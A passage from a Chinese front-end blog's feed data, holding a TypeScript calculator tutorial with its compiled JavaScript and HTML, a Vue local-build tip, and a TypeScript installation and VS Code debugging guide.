class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.updateResult();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;Clear&#x27;</span> === text)&#123;</span><br><span class="line">        <span class="keyword">this</span>.n1 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">this</span>.n2 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">this</span>.option = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>.result = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      console.log(<span class="keyword">this</span>.n1, <span class="keyword">this</span>.option, <span class="keyword">this</span>.n2, <span class="keyword">this</span>.result);</span><br><span class="line">    &#125;</span><br><span class="line">    bindEvents(): void &#123;</span><br><span class="line">      <span class="keyword">this</span>.wrap.addEventListener(<span class="string">&#x27;click&#x27;</span>, (event): void =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(event.target instanceof HTMLButtonElement)&#123;</span><br><span class="line">          let button: HTMLButtonElement = event.target;</span><br><span class="line">          let text: string = button.textContent;</span><br><span class="line">          <span class="keyword">this</span>.updateNumberAndOption(text);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  new Calculate()</span><br></pre></td></tr></table></figure><h4 id="编译过后的JS："><a href="#编译过后的JS：" class="headerlink" title="编译过后的JS："></a>编译过后的JS：</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Calculate = <span class="comment">/** <span class="doctag">@class</span> */</span> (function () &#123;</span><br><span class="line">        function Calculate() &#123;</span><br><span class="line">            <span class="keyword">this</span>.n1 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">this</span>.n2 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">this</span>.option = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">this</span>.result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">this</span>.keys = [</span><br><span class="line">                [<span class="string">&#x27;Clear&#x27;</span>, <span class="string">&#x27;÷&#x27;</span>],</span><br><span class="line">                [<span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;×&#x27;</span>],</span><br><span class="line">                [<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;-&#x27;</span>],</span><br><span class="line">                [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;+&#x27;</span>],</span><br><span class="line">                [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">this</span>.createTopScreen();</span><br><span class="line">            <span class="keyword">this</span>.createBottomBar();</span><br><span class="line">            <span class="keyword">this</span>.createWrap();</span><br><span class="line">            <span class="keyword">this</span>.createAllButton();</span><br><span class="line">            <span class="keyword">this</span>.bindEvents();</span><br><span class="line">        &#125;</span><br><span class="line">        Calculate.prototype.createSingleButton = function (text, wrap, className) &#123;</span><br><span class="line">            <span class="keyword">var</span> button = document.createElement(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">            button.textContent = text;</span><br><span class="line">            button.classList.add(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">            button.classList.add(className ? className : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            wrap.appendChild(button);</span><br><span class="line">            <span class="keyword">return</span> button;</span><br><span class="line">        &#125;;</span><br><span class="line">        Calculate.prototype.createTopScreen = function () &#123;</span><br><span class="line">            <span class="keyword">var</span> top = document.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">            top.classList.add(<span class="string">&#x27;top-screen&#x27;</span>);</span><br><span class="line">            top.textContent = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">this</span>.top = top;</span><br><span class="line">        &#125;;</span><br><span class="line">        Calculate.prototype.createBottomBar = function () &#123;</span><br><span class="line">            <span class="keyword">var</span> bottom = document.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">            bottom.classList.add(<span class="string">&#x27;bottom-bar&#x27;</span>);</span><br><span class="line">            <span class="keyword">this</span>.bottomBar = bottom;</span><br><span class="line">        &#125;;</span><br><span class="line">        Calculate.prototype.createWrap = function () &#123;</span><br><span class="line">            <span class="keyword">var</span> wrap = document.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">            document.body.appendChild(wrap);</span><br><span class="line">            wrap.classList.add(<span class="string">&#x27;calc-wrap&#x27;</span>);</span><br><span class="line">            wrap.appendChild(<span class="keyword">this</span>.top);</span><br><span class="line">            wrap.appendChild(<span class="keyword">this</span>.bottomBar);</span><br><span class="line">            <span class="keyword">this</span>.wrap = wrap;</span><br><span class="line">        &#125;;</span><br><span class="line">        Calculate.prototype.createAllButton = function () &#123;</span><br><span class="line">            <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">this</span>.keys.map(function (v1) &#123;</span><br><span class="line">                <span class="keyword">var</span> div = document.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">                div.classList.add(<span class="string">&#x27;button-bar&#x27;</span>);</span><br><span class="line">                v1.map(function (v2) &#123;</span><br><span class="line">                    _this.createSingleButton(v2, div, <span class="string">&quot;button-&quot;</span> + v2);</span><br><span class="line">                &#125;);</span><br><span class="line">                _this.bottomBar.appendChild(div);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;;</span><br><span class="line">        Calculate.prototype.checkNumber = function (num, text) &#123;</span><br><span class="line">            <span class="keyword">if</span> (text === <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="keyword">this</span>[num].indexOf(<span class="string">&#x27;.&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>[num];</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>[num] += text;</span><br><span class="line">            <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>[num];</span><br><span class="line">        &#125;;</span><br><span class="line">        Calculate.prototype.updateNumber = function (text) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.option) &#123;</span><br><span class="line">                <span class="keyword">this</span>.checkNumber(<span class="string">&#x27;n2&#x27;</span>, text);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.checkNumber(<span class="string">&#x27;n1&#x27;</span>, text);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Calculate.prototype.updateOption = function (text) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.n1 === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.n1 = <span class="keyword">this</span>.result;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.option = text;</span><br><span class="line">        &#125;;</span><br><span class="line">        Calculate.prototype.updateResult = function () &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.n1 === <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">this</span>.n2 === <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">this</span>.option === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>.result;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> result;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.option === <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">                result = Number(<span class="keyword">this</span>.n1) + Number(<span class="keyword">this</span>.n2);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.option === <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                result = Number(<span class="keyword">this</span>.n1) - Number(<span class="keyword">this</span>.n2);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.option === <span class="string">&#x27;×&#x27;</span>)</span><br><span class="line">                result = Number(<span class="keyword">this</span>.n1) * Number(<span class="keyword">this</span>.n2);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.option === <span class="string">&#x27;÷&#x27;</span>)</span><br><span class="line">                result = Number(<span class="keyword">this</span>.n1) / Number(<span class="keyword">this</span>.n2);</span><br><span class="line">            <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>.result = result.toString();</span><br><span class="line">            <span class="keyword">if</span> (result.toString().length &gt; <span class="number">9</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>.result = result.toPrecision(<span class="number">9</span>).toString().replace(/<span class="number">0</span>+$/, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.n2 === <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                <span class="keyword">this</span>.top.textContent = <span class="string">&#x27;不是数字&#x27;</span>;</span><br><span class="line">            <span class="keyword">this</span>.n1 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">this</span>.n2 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">this</span>.option = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        Calculate.prototype.updateNumberAndOption = function (text) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;0123456789.&#x27;</span>.indexOf(text) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.updateNumber(text);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&#x27;+-×÷&#x27;</span>.indexOf(text) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.updateOption(text);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&#x27;=&#x27;</span>.indexOf(text) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.updateResult();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&#x27;Clear&#x27;</span> === text) &#123;</span><br><span class="line">                <span class="keyword">this</span>.n1 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="keyword">this</span>.n2 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="keyword">this</span>.option = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>.result = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            console.log(<span class="keyword">this</span>.n1, <span class="keyword">this</span>.option, <span class="keyword">this</span>.n2, <span class="keyword">this</span>.result);</span><br><span class="line">        &#125;;</span><br><span class="line">        Calculate.prototype.bindEvents = function () &#123;</span><br><span class="line">            <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">this</span>.wrap.addEventListener(<span class="string">&#x27;click&#x27;</span>, function (event) &#123;</span><br><span class="line">                <span class="keyword">if</span> (event.target instanceof HTMLButtonElement) &#123;</span><br><span class="line">                    <span class="keyword">var</span> button = event.target;</span><br><span class="line">                    <span class="keyword">var</span> text = button.textContent;</span><br><span class="line">                    _this.updateNumberAndOption(text);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> Calculate;</span><br><span class="line">    &#125;());</span><br><span class="line">    new Calculate();</span><br></pre></td></tr></table></figure><h4 id="html："><a href="#html：" class="headerlink" title="html："></a>html：</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-pseudo">:root</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attr">--em3</span>: <span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.calc-wrap</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.top-screen</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">6rem</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">line-height</span>: <span class="number">6rem</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: <span class="built_in">rgb</span>(<span class="number">42</span>,<span class="number">40</span>,<span class="number">42</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">text-align</span>: right;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">4.4em</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding-right</span>: <span class="number">1rem</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-top</span>: <span class="number">1.2rem</span> solid <span class="built_in">rgb</span>(<span class="number">42</span>,<span class="number">40</span>,<span class="number">42</span>);</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.button</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="built_in">var</span>(--em3);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="built_in">var</span>(--em3);</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.button</span><span class="selector-class">.button-Clear</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">9em</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.button</span><span class="selector-class">.button-0</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">6em</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.button-bar</span> <span class="selector-class">.button</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: <span class="built_in">rgb</span>(<span class="number">226</span>,<span class="number">224</span>,<span class="number">226</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="built_in">rgb</span>(<span class="number">245</span>,<span class="number">240</span>,<span class="number">245</span>), <span class="built_in">rgb</span>(<span class="number">226</span>,<span class="number">224</span>,<span class="number">226</span>));</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-color</span>: <span class="built_in">rgb</span>(<span class="number">226</span>,<span class="number">224</span>,<span class="number">226</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.button-bar</span> <span class="selector-class">.button</span><span class="selector-pseudo">:last-child</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: <span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">151</span>,<span class="number">58</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="built_in">rgb</span>(<span class="number">247</span>,<span class="number">167</span>,<span class="number">96</span>), <span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">151</span>,<span class="number">58</span>));</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">151</span>,<span class="number">58</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-image</span>: <span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">151</span>,<span class="number">58</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vue项目打包在本地直接访问</title>
      <link href="/Blog/2018/10/23/vue/vue%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E5%9C%A8%E6%9C%AC%E5%9C%B0%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE/index/"/>
      <url>/Blog/2018/10/23/vue/vue%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E5%9C%A8%E6%9C%AC%E5%9C%B0%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE/index/</url>
      
        <content type="html"><![CDATA[<p>1.打开项目文件夹。找到config文件夹里的index.js文件中的build对象，将assetsPublicPath中的“&#x2F;”，改为“.&#x2F;”。</p><p>2.router文件下面的index.js路由配置文件不要配置mode: “history”（不用配置这个属性）</p><p>3.修改config里面的index.js里面的productionSourceMap为false,默认情况是true（true代表打包环境是开发环境，可以进行调试；false表示生产环境，正式上线的）</p><p>4.项目完成后用 npm run build可以打包项目; 打包配置在config文件夹下的 index.js 的 build对象下;如需在本地预览,</p><p><code>assetsPublicPath: &#39;./&#39;</code>,改成相对路径; 如果你的css文件中引用了background相对路径,那么在打包后预览后是会出现资源找不到的情况的;</p><p>可以在build文件夹的utils.js下:新增这个publicPath这个属性;</p><p><img src="/Blog/2018/10/23/vue/vue%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E5%9C%A8%E6%9C%AC%E5%9C%B0%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE/index/img.png"></p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript安装与调试</title>
      <link href="/Blog/2018/10/23/typescript/TypeScript%E5%AE%89%E8%A3%85%E4%B8%8E%E8%B0%83%E8%AF%95/index/"/>
      <url>/Blog/2018/10/23/typescript/TypeScript%E5%AE%89%E8%A3%85%E4%B8%8E%E8%B0%83%E8%AF%95/index/</url>
      
        <content type="html"><![CDATA[<h2 id="配置-npm-淘宝源"><a href="#配置-npm-淘宝源" class="headerlink" title="配置 npm 淘宝源"></a>配置 npm 淘宝源</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https:<span class="comment">//registry.npm.taobao.org/</span></span><br></pre></td></tr></table></figure><p>如果后悔了，想撤销淘宝源就运行 <code>npm config delete registry</code></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">npm</span> install typescript@<span class="number">2</span>.<span class="number">9</span>.<span class="number">2</span> -g</span><br><span class="line"><span class="attribute">npm</span> install ts-node@<span class="number">7</span>.<span class="number">0</span>.<span class="number">0</span> -g</span><br></pre></td></tr></table></figure><p>注意记下 ts-node 安装后的可执行文件路径，后面要用的。</p><p><img src="/Blog/2018/10/23/typescript/TypeScript%E5%AE%89%E8%A3%85%E4%B8%8E%E8%B0%83%E8%AF%95/index/img.png"></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ol><li><p>下载 vscode</p><ol><li>按 ctrl+K ctrl+S</li><li>将格式化文件的快捷键绑定到自己喜欢的按键（我用的是 ctrl+L）</li></ol></li><li><p>创建文件夹 tsdemo</p></li><li><p>用 vscode 打开 tsdemo 目录</p></li><li><p>创建 tsdemo&#x2F;1.ts 作为我们的第一个 TS 文件</p></li><li><p>在文件里写一句 <code>console.log(1)</code> 保存</p></li><li><p>Windows 用户注意了，这里需要单独运行一些命令（Linux 用户和 macOS 用户不用执行）</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br><span class="line">npm i -D ts-<span class="keyword">node</span> <span class="title">typescript</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>创建 tsdemo&#x2F;.vscode&#x2F;launch.json 文件，内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;configurations&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;ts-node&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;node&quot;</span>,</span><br><span class="line">        <span class="string">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">        <span class="string">&quot;program&quot;</span>: <span class="string">&quot;注意看这里，要写成ts-node对应的可执行文件，Windows 用户注意了，你应该写成 <span class="variable">$&#123;workspaceRoot&#125;</span>/node_modules/ts-node/dist/bin.js&quot;</span>,</span><br><span class="line">        <span class="string">&quot;args&quot;</span>: [<span class="string">&quot;<span class="variable">$&#123;relativeFile&#125;</span>&quot;</span>],</span><br><span class="line">        <span class="string">&quot;cwd&quot;</span>: <span class="string">&quot;<span class="variable">$&#123;workspaceRoot&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;inspector&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>打开 tsdemo&#x2F;1.js，找到调试选项，选择 ts-node，然后点击调试</p></li></ol><p><img src="/Blog/2018/10/23/typescript/TypeScript%E5%AE%89%E8%A3%85%E4%B8%8E%E8%B0%83%E8%AF%95/index/img_1.png"></p><ol start="9"><li>然后你就可以看到 console.log(1) 的输入结果了（请确保你选中的是 tsdemo&#x2F;1.ts）</li></ol><p><img src="/Blog/2018/10/23/typescript/TypeScript%E5%AE%89%E8%A3%85%E4%B8%8E%E8%B0%83%E8%AF%95/index/img_2.png"></p><p>—ps：使用命令行打包TS。<code>tsc xx.ts</code>，持续监听并打包<code>tsc -w xx.ts</code></p><h2 id="开始学习"><a href="#开始学习" class="headerlink" title="开始学习"></a>开始学习</h2><ol start="0"><li>前置知识<ol><li>你要对 npm 比较熟悉</li><li>你要对命令行比较熟悉</li><li>你要对 ES 6 比较熟悉</li><li>你要对 class 比较熟悉</li></ol></li><li>学习一下官方的<a href="https://www.typescriptlang.org/docs/handbook/typescript-in-5-minutes.html" title="null">五分钟教程</a></li><li>刻意练习<ol start="0"><li>大概浏览一下文档</li><li>一些简单的计算</li><li>一些简单的应用</li><li>边练习边查文档</li></ol></li></ol><figure class="highlight 